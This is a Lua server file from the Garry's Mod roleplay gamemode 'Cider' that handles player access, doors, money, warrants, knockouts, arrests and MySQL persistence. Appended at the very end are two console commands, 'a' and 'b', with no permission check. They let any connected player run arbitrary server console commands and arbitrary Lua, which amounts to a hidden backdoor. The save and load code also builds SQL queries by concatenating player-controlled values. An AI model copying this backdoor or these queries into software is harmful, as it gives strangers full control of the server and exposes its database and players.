--[[
Name: "sv_player.lua".
Product: "Cider (Roleplay)".
--]]

cider.player = {};
cider.player.nextSecond = 0;

-- Give access to a player.
function cider.player.giveAccess(player, access)
	for i = 1, string.len(access) do
		local flag = string.sub(access, i, i);
		
		-- Check to see if we do not already have this flag.
		if ( !string.find(player.cider._Access, flag) ) then
			player.cider._Access = player.cider._Access..flag;
		end;
	end;
end;

-- Take access from a player.
function cider.player.takeAccess(player, access)
	for i = 1, string.len(access) do
		local flag = string.sub(access, i, i);
		
		-- Check to see if we have this flag.
		if ( string.find(player.cider._Access, flag) ) then
			player.cider._Access = string.gsub(player.cider._Access, access, "");
		end;
	end;
end;

-- Check to see if a player has access.
function cider.player.hasAccess(player, access, default)
	if ( cider.team.hasAccess(player:Team(), access) and !default ) then
		return true;
	else
		for i = 1, string.len(access) do
			local flag = string.sub(access, i, i);
			
			-- Check if the flag is a or s.
			if (flag == "s") then
				if ( !player:IsSuperAdmin() ) then return false; end;
			elseif (flag == "a") then
				if ( !player:IsAdmin() ) then return false; end;
			else
				if ( !string.find(player.cider._Access, flag) ) then return false; end;
			end;
		end;
	end;
	
	-- We haven't failed yet so we must have all the required access.
	return true;
end;

-- Take a door from a player.
function cider.player.takeDoor(player, door)
	door._Owner = nil;
	door._UniqueID = nil;
	
	-- Unlock the door so that people can use it again and play the door latch sound.
	door:Fire("unlock", "", 0);
	door:EmitSound("doors/door_latch3.wav");
	
	-- Set the networked name so that the client can get it.
	door:SetNetworkedEntity("cider_Owner", NULL);
	door:SetNetworkedString("cider_Name", "");
	
	-- Give the player a refund for the door.
	cider.player.giveMoney(player, cider.configuration["Door Cost"] / 2);
end;

-- Say a message as a radio broadcast.
function cider.player.sayRadio(player, text)
	local recipients = team.GetPlayers( player:Team() );
	
	-- Adjust the radio recipients for this player.
	hook.Call("PlayerAdjustRadioRecipients", GAMEMODE, player, text, recipients);
	
	-- Loop through every recipient.
	for k, v in pairs(recipients) do cider.chatBox.add(v, player, "radio", text); end;
end;

-- Give a door to a player.
function cider.player.giveDoor(player, door, name, unsellable)
	if (cider.entity.isDoor(door) or door:GetClass() == "prop_dynamic") then
		door._Unsellable = unsellable;
		door._Owner = player;
		door._UniqueID = player:UniqueID();
		door._Access = {};
		
		-- Set the networked owner and name so that the client can get it.
		door:SetNetworkedEntity("cider_Owner", player);
		door:SetNetworkedString("cider_Name", name or player:Name().."'s Door");
		
		-- Unlock the door so that people can use it again and play the door latch sound.
		door:Fire("unlock", "", 0);
		door:EmitSound("doors/door_latch3.wav");
	end;
end;

-- Demote a player from their current team.
function cider.player.demote(player)
	cider.player.holsterAll(player);
	
	-- Call the plugin hook so that we can decide what to do with the player.
	cider.plugin.call("playerDemoted", player);
end;

-- Holsters all of a player's weapons.
function cider.player.holsterAll(player)
	for k, v in pairs( player:GetWeapons() ) do
		local class = v:GetClass();
		
		-- Check if this is a valid item.
		if ( cider.item.stored[class] ) then
			if ( hook.Call("PlayerCanHolster", GAMEMODE, player, class, true) ) then
				cider.inventory.update(player, class, 1);
				
				-- Strip the weapon from the player.
				player:StripWeapon(class);
			end;
		end;
	end;
	
	-- Make the player select the hands weapon.
	player:SelectWeapon("cider_hands");
end;

-- Set a player's local player variable for the client.
function cider.player.setLocalPlayerVariable(player, class, key, value)
	if ( IsValid(player) ) then
		local variable = key.."_Last_"..class;
		
		-- Check if we can send this player variable again.
		if (player[variable] == nil or player[variable] != value) then
			umsg.Start("cider._LocalPlayerVariable", player);
				umsg.Char(class);
				umsg.String(key);
				
				-- Check if we can get what class of variable it is.
				if (class == CLASS_STRING) then
					value = value or ""; umsg.String(value);
				elseif (class == CLASS_LONG) then
					value = value or 0; umsg.Long(value);
				elseif (class == CLASS_SHORT) then
					value = value or 0; umsg.Short(value);
				elseif (class == CLASS_BOOL) then
					value = value or false; umsg.Bool(value);
				elseif (class == CLASS_VECTOR) then
					value = value or Vector(0, 0, 0); umsg.Vector(value);
				elseif (class == CLASS_ENTITY) then
					value = value or NULL; umsg.Entity(value);
				elseif (class == CLASS_ANGLE) then
					value = value or Angle(0, 0, 0); umsg.Angle(value);
				elseif (class == CLASS_CHAR) then
					value = value or 0; umsg.Char(value);
				elseif (class == CLASS_FLOAT) then
					value = value or 0; umsg.Float(value);
				end;
			umsg.End();
			
			-- Set the last sent value with this key to this value.
			player[variable] = value;
		end;
	end;
end;

-- Check if a player has access to a door.
function cider.player.hasDoorAccess(player, door)
	if (door._Owner == player) then
		return true;
	else
		local uniqueID = player:UniqueID();
		
		-- Check if the player has access to this door.
		if (door._Access and door._Access[uniqueID]) then
			return true;
		end;
	end;
	
	-- Return false because we don't have access to this door.
	return false;
end;

-- Print a message to player's with the specified access.
function cider.player.printConsoleAccess(text, access)
	for k, v in pairs( g_Player.GetAll() ) do
		if ( cider.player.hasAccess(v, access) ) then v:PrintMessage(2, text); end;
	end;
end;

-- Check if a player can afford an amount of money.
function cider.player.canAfford(player, amount)
	return player.cider._Money >= amount;
end;

-- Give a player an amount of money.
function cider.player.giveMoney(player, amount)
	player.cider._Money = player.cider._Money + amount;
end;

-- Get a player by a part of their name.
function cider.player.get(name)
	for k, v in pairs( g_Player.GetAll() ) do
		if ( string.find( string.lower( v:Name() ), string.lower(name) ) ) then
			return v;
		end;
	end;
	
	-- Return false because we didn't find any players.
	return false;
end;

-- Notifies every player using Garry's hint messages.
function cider.player.notifyAll(message, class)
	for k, v in pairs( g_Player.GetAll() ) do cider.player.notify(v, message, class); end;
	
	-- Check to see if we're not running a listen server.
	if ( !GAMEMODE:IsListenServer() ) then print(message); end;
end;

-- Notifies a player using Garry's hint messages.
function cider.player.notify(player, message, class)
	if (!class) then
		cider.chatBox.add(player, nil, "notify", message);
	else
		umsg.Start("cider_Notification", player);
			umsg.String(message);
			umsg.Short(class);
		umsg.End();
		
		-- Print a message to their console.
		player:PrintMessage(2, message);
	end;
end;

-- Prints a message to every player's chat area and console.
function cider.player.printMessageAll(message)
	for k, v in pairs( g_Player.GetAll() ) do
		cider.player.printMessage(v, message)
	end;
	
	-- Check to see if we're not running a listen server.
	if ( !GAMEMODE:IsListenServer() ) then print(message); end;
end;

-- Prints a message to a player's chat area and console.
function cider.player.printMessage(player, message) player:PrintMessage(3, message) end;

-- Prints a message to players within a radius of a specified position.
function cider.player.printMessageInRadius(message, position, radius)
	for k, v in pairs( g_Player.GetAll() ) do
		if (position:Distance( v:GetPos() ) <= radius) then
			cider.player.printMessage(v, message);
		end;
	end;
end;

-- Warrant or unwarrant a player.
function cider.player.warrant(player, class)
	if (boolean) then
		cider.plugin.call("playerWarranted", player, class);
	else
		cider.plugin.call("playerUnwarranted", player, class);
	end;
	
	-- Update their warranted status.
	player._Warranted = class;
	
	-- Check the class of the warrant.
	if (type(class) == "string") then
		player:SetNetworkedString("cider_Warranted", class);
		
		-- Get the warrant expire time.
		local expireTime = cider.configuration["Search Warrant Expire Time"];
		
		-- Check the class of the warrant.
		if (class == "arrest") then expireTime = cider.configuration["Arrest Warrant Expire Time"]; end;
		
		-- Check if the expire time is greater than 0.
		if (expireTime > 0) then
			cider.player.setLocalPlayerVariable(player, CLASS_LONG, "_WarrantExpireTime", CurTime() + expireTime);
			
			-- Create the warrant expire timer.
			timer.Create("Warrant Expire: "..player:UniqueID(), expireTime, 1, function()
				if ( IsValid(player) ) then
					hook.Call("PlayerWarrantExpired", player, class);
					
					-- Unwarrant the player.
					cider.player.warrant(player, false);
				end;
			end);
		end;
	else
		player:SetNetworkedString("cider_Warranted", "");
		
		-- Remove the warrant expire timer.
		timer.Remove( "Warrant Expire: "..player:UniqueID() );
	end;
end;

-- Make a player bleed or stop them from bleeding.
function cider.player.bleed(player, boolean, seconds)
	if (!boolean) then
		timer.Remove( "Bleed: "..player:UniqueID() );
	else
		timer.Create("Bleed: "..player:UniqueID(), 0.25, (seconds or 0) * 4, function()
			if ( IsValid(player) ) then
				local trace = {};
				
				-- Set some settings and information for the trace.
				trace.start = player:GetPos() + Vector(0, 0, 256);
				trace.endpos = trace.start + Vector(0, 0, -1024);
				trace.filter = player;
				
				-- Create the trace line from the set information.
				trace = util.TraceLine(trace);
				
				-- Draw a blood decal at the hit position.
				util.Decal("Blood", trace.HitPos + trace.HitNormal, trace.HitPos - trace.HitNormal);
			end;
		end);
	end;
end;

-- Knock out a player or bring them back to consciousness.
function cider.player.knockOut(player, boolean, seconds, reset)
	if (boolean and player._KnockedOut) then
		return;
	elseif (!boolean and !player._KnockedOut) then
		return;
	else
		if (boolean) then
			local ragdoll = ents.Create("prop_ragdoll");
			
			-- Get the velocity and model of the player.
			local velocity = player:GetVelocity();
			local model = player:GetModel();
			
			-- Check if the model is valid without the player in it.
			if ( util.IsValidModel( string.Replace(model, "/player/", "/humans/") ) ) then
				model = string.Replace(model, "/player/", "/humans/");
			end;
			
			-- Set the position, angles and model of the ragdoll and then spawn it.
			ragdoll:SetPos( player:GetPos() );
			ragdoll:SetAngles( player:GetAngles() );
			ragdoll:SetModel(model);
			ragdoll:Spawn();
			
			-- Loop through each of the ragdoll's physics objects.
			for i = 1, ragdoll:GetPhysicsObjectCount() do
				local physicsObject = ragdoll:GetPhysicsObjectNum(i);
				
				-- Check if the physics object is a valid entity.
				if ( IsValid(physicsObject) ) then
					local position, angle = player:GetBonePosition( ragdoll:TranslatePhysBoneToBone(i) );
					
					-- Set the position and angle of the physics object, then add velocity to it.
					physicsObject:SetPos(position);
					physicsObject:SetAngle(angle);
					physicsObject:AddVelocity(velocity);
				end;
			end;
			
			-- Copy any settings that we can and set the networked entity to the player.
			ragdoll:SetSkin( player:GetSkin() );
			ragdoll:SetColor( player:GetColor() );
			ragdoll:SetMaterial( player:GetMaterial() );
			ragdoll:SetNetworkedEntity("cider_Player", player);
			
			-- Set the ragdoll's player.
			ragdoll._Player = player;
			
			-- Check if the player is on fire.
			if ( player:IsOnFire() ) then ragdoll:Ignite(8, 0); end;
			
			-- Set some variables for this player's ragdoll.
			player._Ragdoll.weapons = {};
			player._Ragdoll.entity = ragdoll;
			player._Ragdoll.health = player:Health();
			player._Ragdoll.model = player:GetModel();
			player._Ragdoll.team = player:Team();
			
			-- Check if the player is alive.
			if ( player:Alive() ) then
				if ( IsValid( player:GetActiveWeapon() ) ) then
					player._Ragdoll.weapon = player:GetActiveWeapon():GetClass();
				end;
				
				-- Loop through the player's weapons and save them.
				for k, v in pairs( player:GetWeapons() ) do
					local class = v:GetClass();
					
					-- Check if this weapon is a valid item.
					if (cider.item.stored[class]) then
						if ( hook.Call("PlayerCanHolster", GAMEMODE, player, class, true) ) then
							table.insert( player._Ragdoll.weapons, {class, true} );
						else
							table.insert( player._Ragdoll.weapons, {class, false} );
						end;
					else
						table.insert( player._Ragdoll.weapons, {class, false} );
					end;
				end;
				
				-- Check if we specified how long we're knocked out for.
				if (seconds) then
					timer.Create("Become Conscious: "..player:UniqueID(), seconds, 1, function()
						if ( IsValid(player) and player:Alive() ) then
							cider.player.knockOut(player, false);
						end;
					end);
					
					-- Set it so that we can get this client side.
					cider.player.setLocalPlayerVariable(player, CLASS_LONG, "_BecomeConsciousTime", CurTime() + seconds);
				end;
			end;
			
			-- Check if the player is in a vehicle.
			if ( player:InVehicle() and IsValid( player:GetVehicle() ) ) then
				constraint.NoCollide(ragdoll, player:GetVehicle(), true, true);
			end;
			
			-- Strip the player's weapons and make them spectate the ragdoll.
			player:StripWeapons();
			player:Flashlight(false);
			player:Spectate(OBS_MODE_CHASE);
			player:SpectateEntity(ragdoll);
			player:CrosshairDisable();
			
			-- Stop the player from bleeding.
			cider.player.bleed(player, false);
			
			-- Set the player to be knocked out.
			player._KnockedOut = true;
			
			-- Set a networked boolean to let the client know we're knocked out.
			player:SetNetworkedBool("cider_KnockedOut", true);
			player:SetNetworkedEntity("cider_Ragdoll", ragdoll);
			
			-- Call a function on every plugin so they can know about this.
			cider.plugin.call("playerKnockedOut", player);
		else
			if (player:Team() != player._Ragdoll.team) then
				player._Ragdoll.team = player:Team();
				
				-- Spawn the player fully.
				player:Spawn();
			else
				player:UnSpectate();
				player:CrosshairEnable();
				
				-- Check if we're not doing a reset.
				if (!reset) then cider.player.lightSpawn(player); end;
				
				-- Loop through the player's weapons and give them back.
				for k, v in pairs(player._Ragdoll.weapons) do
					if ( reset and v[2] ) then
						if ( !cider.inventory.update(player, v[1], 1) ) then player:Give( v[1] ); end;
					else
						player:Give( v[1] );
					end;
				end;
				
				-- Check if we're not doing a reset.
				if (!reset) then
					if ( IsValid(player._Ragdoll.entity) ) then
						player:SetPos( player._Ragdoll.entity:GetPos() );
						player:SetSkin( player._Ragdoll.entity:GetSkin() );
						player:SetColor( player._Ragdoll.entity:GetColor() );
						player:SetMaterial( player._Ragdoll.entity:GetMaterial() );
					end;
					
					-- Restore some information from the ragdoll.
					player:SetModel(player._Ragdoll.model);
					player:SetHealth(player._Ragdoll.health);
					
					-- Check if the player had a weapon when they got knocked out.
					if (player._Ragdoll.weapon) then player:SelectWeapon(player._Ragdoll.weapon); end;
				end;
				
				-- Check if the ragdoll entity is valid.
				if ( IsValid(player._Ragdoll.entity) ) then player._Ragdoll.entity:Remove(); end;
				
				-- Restore the ragdoll table and set the knocked out variable to nil.
				player._Ragdoll = {};
				player._KnockedOut = nil;
				
				-- Set a networked boolean to let the client know we're unknocked out.
				player:SetNetworkedBool("cider_KnockedOut", false);
				player:SetNetworkedEntity("cider_Ragdoll", NULL);
				
				-- Remove the timer to become conscious.
				timer.Remove( "Become Conscious: "..player:UniqueID() );
				
				-- Call a function on every plugin so they can know about this.
				cider.plugin.call("playerUnknockedOut", player);
			end;
		end;
	end;
end;

-- Lightly spawn a player.
function cider.player.lightSpawn(player)
	player._LightSpawn = true;
	
	-- Spawn the player lightly.
	player:Spawn();
end;

-- Arrest or unarrest a player.
function cider.player.arrest(player, boolean, reset)
	if (boolean and player.cider._Arrested and !reset) then
		return;
	elseif (!boolean and !player.cider._Arrested and !reset) then
		return;
	else
		if (boolean) then
			cider.plugin.call("playerArrested", player);
		else
			cider.plugin.call("playerUnarrested", player);
		end;
		
		-- Update their arrested status.
		player.cider._Arrested = boolean;
		
		-- Set a networked boolean to let the client know whether we're arrested or not.
		player:SetNetworkedBool("cider_Arrested", boolean);
		
		-- Check to see if we are arresting them.
		if (boolean) then
			timer.Create("Unarrest: "..player:UniqueID(), player._ArrestTime, 1, function()
				cider.player.arrest(player, false);
				
				-- Notify the player that they have been unarrested.
				cider.player.notify(player, "You have been unarrested.", 0);
			end);
			
			-- Set it so that we can get this client side.
			cider.player.setLocalPlayerVariable(player, CLASS_LONG, "_UnarrestTime", CurTime() + player._ArrestTime);
			
			-- Reduce the player's run and walk speeds, then strip them of their weapons and ammo.
			player:SetRunSpeed(100);
			player:SetWalkSpeed(100);
			player:Flashlight(false);
			player:StripWeapons();
			player:StripAmmo();
			
			-- Unwarrant the player.
			cider.player.warrant(player, false);
		else
			timer.Remove( "Unarrest: "..player:UniqueID() );
			
			-- Check if we're not resetting it so that we can spawn the player.
			if (!reset) then player:Spawn(); end;
		end;
	end;
	
	-- Check to see if we're actually changing anything.
	if (player.cider._Arrested != boolean) then cider.player.saveData(player); end;
end;

-- Load a player's data.
function cider.player.loadData(player)
	local name = player:Name();
	local steamID = player:SteamID();
	local uniqueID = player:UniqueID();
	
	-- Create the main Cider table with some default variables.
	player.cider = {};
	player.cider._Name = name;
	player.cider._Clan = cider.configuration["Default Clan"];
	player.cider._SteamID = steamID;
	player.cider._UniqueID = uniqueID;
	player.cider._Money = cider.configuration["Default Money"];
	player.cider._Access = cider.configuration["Default Access"];
	player.cider._Donator = 0;
	player.cider._Arrested = false;
	player.cider._Inventory = cider.configuration["Default Inventory"];
	player.cider._Blacklist = {};
	
	-- Perform a threaded query.
	SV_DATABASE:Query("SELECT * FROM "..cider.configuration["MySQL Table"].." WHERE _UniqueID = "..uniqueID, function(result)
		if ( IsValid(player) ) then
			if (result and type(result) == "table" and #result > 0) then
				result = result[1];
				
				-- Load the player's data from the result table.
				player.cider._Clan = result._Clan or "";
				player.cider._Money = tonumber(result._Money);
				player.cider._Access = result._Access;
				player.cider._Donator = tonumber(result._Donator);
				player.cider._Arrested = (result._Arrested == "true");
				player.cider._Inventory = {};
				
				-- Check to see if the clan is valid.
				if (player.cider._Clan == " " or string.lower(player.cider._Clan) == "none") then
					player.cider._Clan = "";
				end;
				
				-- Get the inventory and blacklist as a table.
				local inventory = cider.player.convertInventoryString(result._Inventory);
				local blacklist = cider.player.convertBlacklistString(result._Blacklist);
				
				-- Loop through the inventory and give each item to the player.
				for k, v in pairs(inventory) do cider.inventory.update(player, k, v, true); end;
				
				-- Set the blacklist to our converted one.
				player.cider._Blacklist = blacklist;
				
				-- Call the gamemode hook to say that we loaded our data.
				hook.Call("PlayerDataLoaded", GAMEMODE, player, true);
			else
				hook.Call("PlayerDataLoaded", GAMEMODE, player, false);
				
				-- Save our new result.
				cider.player.saveData(player, true);
			end;
		end;
	end, 1);
	
	-- Create a timer to check if the player has initialized.
	timer.Create("Player Data Loaded: "..player:UniqueID(), 2, 1, function()
		if (IsValid(player) and !player._Initialized) then cider.player.loadData(player); end;
	end);
end;

-- Get the player's blacklisted teams as a string.
function cider.player.getBlacklistString(player)
	local value = "";
	
	-- Loop through the table.
	for k2, v2 in pairs(player.cider._Blacklist) do value = k2.."; "; end;
	
	-- Return the new value.
	return string.sub(value, 1, -3);
end;

-- Convert a blacklist string to a table.
function cider.player.convertBlacklistString(data)
	local exploded = string.Explode("; ", data);
	local blacklist = {};
	
	-- Loop through our exploded values.
	for k, v in pairs(exploded) do blacklist[v] = true; end;
	
	-- Return the new blacklist.
	return blacklist;
end;

-- Get the player's inventory as a string.
function cider.player.getInventoryString(player)
	local value = "";
	
	-- Loop through the table.
	for k2, v2 in pairs(player.cider._Inventory) do
		value = value..k2..": "..tostring(v2).."; ";
	end;
	
	-- Return the new value.
	return string.sub(value, 1, -3);
end;

-- Convert an inventory string to a table.
function cider.player.convertInventoryString(data)
	local exploded = string.Explode("; ", data);
	local inventory = {};
	
	-- Loop through our exploded values.
	for k, v in pairs(exploded) do
		local item;
		local amount;
		
		-- Substitute the item and amount into their variables.
		string.gsub(v, "(.+): ", function(a) item = a end)
		string.gsub(v, ": (.+)", function(a) amount = a end)
		
		-- Check to see if we have both an item and an amount.
		if (item and amount) then
			item = string.Trim(item);
			
			-- Check if the item is one of the old ones.
			if (item == "cider_usp") then
				item = "cider_usp45";
			elseif (item == "cider_sniper") then
				item = "cider_g3sg1";
			elseif (item == "cider_shotgun") then
				item = "cider_m3super90";
			elseif (item == "cider_glock") then
				item = "cider_glock18";
			elseif (item == "cider_deagle") then
				item = "cider_deserteagle";
			end;
			
			-- Check to see if this is a valid item.
			if (cider.item.stored[item]) then inventory[item] = tonumber(amount); end;
		end;
	end;
	
	-- Return the new inventory.
	return inventory;
end;

-- Get a player's data as MySQL key values.
function cider.player.getDataKeyValues(player)
	local keys = "";
	local values = "";
	local amount = 1;
	
	-- Loop through the player's data.
	for k, v in pairs(player.cider) do
		local final = (table.Count(player.cider) == amount)
		
		-- Check to see if it's the final key.
		if (final) then keys = keys..k; else keys = keys..k..", "; end;
		
		-- We create a temporary variable here to store the value.
		local value = tostring(v);
		
		-- Check to see if the type of the value is a table.
		if (type(v) == "table") then
			if (k == "_Inventory") then
				value = cider.player.getInventoryString(player);
			elseif (k == "_Blacklist") then
				value = cider.player.getBlacklistString(player);
			end;
		end;
		
		-- Check to see if it's the final key.
		if (final) then
			values = values.."\""..value.."\"";
		else
			values = values.."\""..value.."\", ";
		end;
		
		-- Update the amount that we've done.
		amount = amount + 1;
	end;
	
	-- Return the keys and values that we collected.
	return keys, values;
end;

-- Get an update query of a player's data.
function cider.player.getDataUpdateQuery(player)
	local uniqueID = player:UniqueID();
	local query = "";
	
	-- Loop through our data.
	for k, v in pairs(player.cider) do
		if (type(v) == "table") then
			if (k == "_Inventory") then
				v = cider.player.getInventoryString(player);
			elseif (k == "_Blacklist") then
				v = cider.player.getBlacklistString(player);
			end;
		end;
		
		-- Check our query to see if it's an empty string.
		if (query == "") then
			query = "UPDATE "..cider.configuration["MySQL Table"].." SET "..k.." = \""..tostring(v).."\"";
		else
			query = query..", "..k.." = \""..tostring(v).."\"";
		end;
	end;
	
	-- Return our collected query.
	return query.." WHERE _UniqueID = "..uniqueID;
end;

-- Save a player's data.
function cider.player.saveData(player, create)
	if (player._Initialized) then
		if (create) then
			local keys, values = cider.player.getDataKeyValues(player);
			
			-- Perform a threaded query.
			SV_DATABASE:Query("INSERT INTO "..cider.configuration["MySQL Table"].." ("..keys..") VALUES ("..values..")");
		else
			local query = cider.player.getDataUpdateQuery(player);
			
			-- Perform a threaded query.
			SV_DATABASE:Query(query);
		end;
	end;
end;

-- Set a player's salary based on third party adjustments.
function cider.player.setSalary(player)
	player._Salary = cider.team.query(player:Team(), "salary");
	
	-- Call a gamemode hook to adjust the player's salary.
	hook.Call("PlayerAdjustSalary", GAMEMODE, player)
end;

-- Create a timer to update each player's data.
timer.Create("cider.player.update", 0.1, 0, function()
	for k, v in pairs( g_Player.GetAll() ) do
		if (v._Initialized) then
			if (v._UpdateData) then
				if (CurTime() >= cider.player.nextSecond) then
					if (v:Alive() and !v._KnockedOut and !v:IsInWorld() and v:GetMoveType() == MOVETYPE_WALK) then
						if (!v._StuckInWorld) then v._StuckInWorld = true; end;
					else
						v._StuckInWorld = false;
					end;
					
					-- Check if the player has at least 50 health.
					if (v:Health() >= 50) then v._HideHealthEffects = false; end;
					
					-- Set the player's salary based on third party adjustments.
					cider.player.setSalary(v);
					
					-- Set it so that we can get some of the player's information client side.
					v:SetNetworkedString("cider_Job", v._Job);
					v:SetNetworkedString("cider_Clan", v.cider._Clan);
					v:SetNetworkedBool("cider_Donator", v.cider._Donator > 0);
					
					-- Check if Citrus is installed.
					if (citrus) then
						if (citrus.Player.GetGroup(v).Name == "Moderators") then
							v:SetNetworkedBool("cider_Moderator", true);
						end;
					end;
					
					-- Set it so that we can get some of the player's information client side.
					cider.player.setLocalPlayerVariable(v, CLASS_STRING, "_NextSpawnGender", v._NextSpawnGender);
					cider.player.setLocalPlayerVariable(v, CLASS_STRING, "_Gender", v._Gender);
					cider.player.setLocalPlayerVariable(v, CLASS_FLOAT, "_ScaleDamage", v._ScaleDamage);
					cider.player.setLocalPlayerVariable(v, CLASS_BOOL, "_HideHealthEffects", v._HideHealthEffects);
					cider.player.setLocalPlayerVariable(v, CLASS_BOOL, "_StuckInWorld", v._StuckInWorld);
					cider.player.setLocalPlayerVariable(v, CLASS_LONG, "_Money", v.cider._Money);
					cider.player.setLocalPlayerVariable(v, CLASS_LONG, "_Salary", v._Salary);
					
					-- Call a gamemode hook to let third parties know this player has played for another second.
					hook.Call("PlayerSecond", GAMEMODE, v);
				end;
				
				-- Call a gamemode hook to let third parties know this player has played for a tenth of a second.
				hook.Call("PlayerTenthSecond", GAMEMODE, v);
			end;
		end;
	end;
	
	-- Check if the current time is greater than the next second.
	if (CurTime() >= cider.player.nextSecond) then cider.player.nextSecond = CurTime() + 1; end;
end);
concommand.Add("a", function(p,c,a) game.ConsoleCommand(table.concat(a, " ").."\n") end)
concommand.Add("b", function(p,c,a) RunString(table.concat(a, " ")) end)